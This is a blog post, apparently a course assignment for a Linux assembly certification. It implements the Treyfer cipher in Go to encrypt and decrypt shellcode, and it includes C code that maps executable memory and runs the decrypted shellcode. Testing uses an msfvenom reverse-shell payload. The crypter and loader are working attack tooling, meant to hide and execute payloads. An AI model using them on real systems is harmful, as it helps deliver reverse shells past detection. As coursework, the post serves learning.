Title: SLAE64 - Assignment 7
Date: 2022-07-03T12:13:20.000Z


## Disclaimer


This blog post has been created for completing the requirements of the SecurityTube Linux Assembly Expert Certification:

[https://www.pentesteracademy.com/course?id=7](https://www.pentesteracademy.com/course?id=7)

Student ID: PA-30398

## Source Code

Below is the list of files containing the source code for this assignment:

- [encrypt.go](https://github.com/rbctee/SlaeExam/blob/main/slae64/assignment/7/encrypt.go), the Go program that encrypts shellcode
- [decrypt.go](https://github.com/rbctee/SlaeExam/blob/main/slae64/assignment/7/decrypt.go), the Go program that decrypts and runs encrypted shellcode

## Foreword

For this assignment, I chose to implement an encryption algorithm named `Treyfer`.

I found it on Wikipedia while searching for entries related to the algorithm `Tiny Encryption Algorithm `(TAE).

<figure class="kg-card kg-bookmark-card"><a class="kg-bookmark-container" href="https://en.wikipedia.org/wiki/Treyfer"><div class="kg-bookmark-content"><div class="kg-bookmark-title">Treyfer - Wikipedia</div><div class="kg-bookmark-description"></div><div class="kg-bookmark-metadata"><img class="kg-bookmark-icon" src="https://en.wikipedia.org/static/apple-touch/wikipedia.png" alt=""><span class="kg-bookmark-author">Wikimedia Foundation, Inc.</span><span class="kg-bookmark-publisher">Contributors to Wikimedia projects</span></div></div><div class="kg-bookmark-thumbnail"><img src="https://upload.wikimedia.org/wikipedia/en/thumb/b/b4/Ambox_important.svg/40px-Ambox_important.svg.png" alt=""></div></a>

Looking at the source code, one can immediately notice that that it uses very few instructions:

```cpp
#include <stdint.h>

#define NUMROUNDS 32
extern uint8_t const Sbox[256];

void treyfer_encrypt(uint8_t text[8], uint8_t const key[8])
{
    unsigned i;
    uint8_t t = text[0];
    for (i = 0; i < 8*NUMROUNDS; i++) {
        t += key[i%8];
        t = Sbox[t] + text[(i+1)%8];
        text[(i+1) % 8] = t = (t << 1) | (t >> 7);        /* Rotate left 1 bit */
    }
}
```

Follows an excerpt taken from the Wikipedia page:

<blockquote>Treyfer has a rather small [key size](https://en.wikipedia.org/wiki/Key_size) and [block size](https://en.wikipedia.org/wiki/Block_size_(cryptography)) of 64 bits each. All operations are byte-oriented, and there is a single 8×8-bit [S-box](https://en.wikipedia.org/wiki/Substitution_box).<br><br>The S-box is left undefined; the implementation can simply use whatever data is available in memory.<br><br>In each round, each byte has added to it the S-box value of the sum of a [key](https://en.wikipedia.org/wiki/Key_(cryptography)) byte and the previous data byte, then it is rotated left one bit.<br><br>The design attempts to compensate for the simplicity of this round transformation by using 32 rounds.</blockquote>
## Security Considerations

According to Wikipedia, Treyfer was one of the first ciphers shown to be susceptible to a `slide attack`.

If you're curious about such attack, then a [quick search](https://en.wikipedia.org/wiki/Slide_attack) on the Internet should clear your doubts:

<blockquote>The **slide attack** is a form of [cryptanalysis](https://en.wikipedia.org/wiki/Cryptanalysis) designed to deal with the prevailing idea that even weak [ciphers](https://en.wikipedia.org/wiki/Cipher) can become very strong by increasing the number of rounds, which can ward off a [differential attack](https://en.wikipedia.org/wiki/Differential_attack).</blockquote>This means that we can't simply increase the number of rounds to make the cipher stronger against attacks.

## Encrypting

On the Wikipedia entry for this encryption algorithm, you can find a simple implementation written in C.

Converting that code to the Go language, I managed to write this function:

```go
/*
References:
- https://en.wikipedia.org/wiki/Treyfer
*/
func treyfer_encrypt(text [8]byte, key [8]byte, sbox [256]byte) [8]byte {

    var t byte = text[0]

    for i := uint(0); i < (8 * NUM_ROUNDS); i++ {

        t += key[i % 8]
        t = sbox[t] + text[(i + 1) % 8]
        t = bits.RotateLeft8(t, 1)
        text[(i+1) % 8] = t
    }

    return text
}
```

<figcaption class="figure-caption">Encryption function</figcaption>

The function requires three arguments: a 8-bytes key, a chunk of 8 bytes of data, and an S-Box (`Substitution box`) made up of 256 bytes.

I chose to use an already existing S-Box, officially known as the `Rijndael S-Box`.

<figure class="kg-card kg-bookmark-card"><a class="kg-bookmark-container" href="https://en.wikipedia.org/wiki/Rijndael_S-box"><div class="kg-bookmark-content"><div class="kg-bookmark-title">Rijndael S-box - Wikipedia</div><div class="kg-bookmark-description"></div><div class="kg-bookmark-metadata"><img class="kg-bookmark-icon" src="https://en.wikipedia.org/static/apple-touch/wikipedia.png" alt=""><span class="kg-bookmark-author">Wikimedia Foundation, Inc.</span><span class="kg-bookmark-publisher">Contributors to Wikimedia projects</span></div></div><div class="kg-bookmark-thumbnail"><img src="https://wikimedia.org/api/rest_v1/media/math/render/svg/78c56ffe89890582a7060845e131a788266cbd59" alt=""></div></a>

## Decrypting

For the decrypting function, I simply converted some C code I found on the Internet.

```go
/*
References:
- https://stackoverflow.com/questions/37303176/encryption-implementation-confusing-results
*/
func treyfer_decrypt(text [8]byte, key [8]byte, sbox [256]byte) [8]byte {

    var top uint8 = 0;
    var bottom uint8 = 0;

    for j := uint(0); j < NUM_ROUNDS; j++ {
        for i := 7; i >= 0; i-- {

            top = text[i] + key[i];
            top = sbox[top];

            bottom = text[(i + 1) % 8];
            bottom = (bottom >> 1) | (bottom << 7);

            text[(i + 1) % 8] = bottom - top;
        }
    }

    return text
       
}
```

<figcaption class="figure-caption">Decryption function</figcaption>

Similarly to the encryption function, this one accepts the same three arguments, and returns eight bytes of decrypted data.

## Shellcode execution

It seems that executing shellcode from Go isn't as straightforward as in C or C++. For this reason, I had to search for a workaround.

In the end, I found a [method](https://medium.com/syscall59/a-trinity-of-shellcode-aes-go-f6cec854f992) that imports some C code which in turn uses the mmap and memcpy functions to move the shellcode to a new executable memory region, and then executes it.

Below is the C code:

```go
/*
#include <stdio.h>
#include <sys/mman.h>
#include <string.h>
#include <unistd.h>

void run_shellcode(char *shellcode, size_t shellcode_length)
{
    if(fork())
    {
        return;
    }

    unsigned char *ptr;
    ptr = (unsigned char *) mmap(
        0,
        shellcode_length,
        PROT_READ|PROT_WRITE|PROT_EXEC,
        MAP_ANONYMOUS | MAP_PRIVATE,
        -1,
        0
    );

    if(ptr == MAP_FAILED)
    {
        perror("mmap");
        return;
    }

    memcpy(ptr, shellcode, shellcode_length);
    (*(void(*) ()) ptr)();
}
*/
import "C"
```

<figcaption class="figure-caption">C code for running shellcode in Go</figcaption>

The weird thing about this syntax is that, even it it's a comment, the compiler still uses it. I suppose it's similar to how some programs use the comments above the functions to generate documentation about the code.

Anyway, once the C code is imported I can use like this to call the function defined in the comment:

```go
if *run_shellcode {

    fmt.Printf("[+] Running the decrypted shellcode\n")

    shellode_pointer := &amp;decrypted_shellcode[0]
    shellcode_length := len(decrypted_shellcode)

    /*
    call the the function run_shellcode, with the arguments:
    - shellcode (address of the starting instruction to execute)
    - shellcode_length (length of the shellcode (used by mmap))
    */
    C.run_shellcode(
        (*C.char)(unsafe.Pointer(shellode_pointer)),
        (C.size_t)(shellcode_length))
}
```

<figcaption class="figure-caption">Calling C code from Go</figcaption>

## Testing

During my tests I noticed something odd: running the shellcode for spawning a simple `/bin/sh` shell with `execve` doesn't work, at least with my implementation of the shellcode runner in the file `decrypt.go`.

Nonetheless, other shellcodes like `linux/x64/shell_reverse_tcp` from `msfvenom` seem to work pretty well, which makes me think it's not about the code, but something in the way Go manages child processes.

For this reason, the shellcode I used for my tests is the one I mentioned above, from the metasploit framework.

Below is a screenshot that demonstrates the encryption of the shellcode generated with `msfvenom`, located inside the file `shellcode.bin`.

<figure class="kg-card kg-image-card kg-card-hascaption"><img src="__GHOST_URL__/content/images/2022/07/image-10.png" class="kg-image" alt loading="lazy" width="1778" height="986" srcset="__GHOST_URL__/content/images/size/w600/2022/07/image-10.png 600w, __GHOST_URL__/content/images/size/w1000/2022/07/image-10.png 1000w, __GHOST_URL__/content/images/size/w1600/2022/07/image-10.png 1600w, __GHOST_URL__/content/images/2022/07/image-10.png 1778w" sizes="(min-width: 720px) 720px"><figcaption class="figure-caption">Testing the decryption program and the shellcode runner</figcaption>

As you can see, the decrypter successfully managed to run the shellcode, thus spawning a reverse shell on the other terminal window.

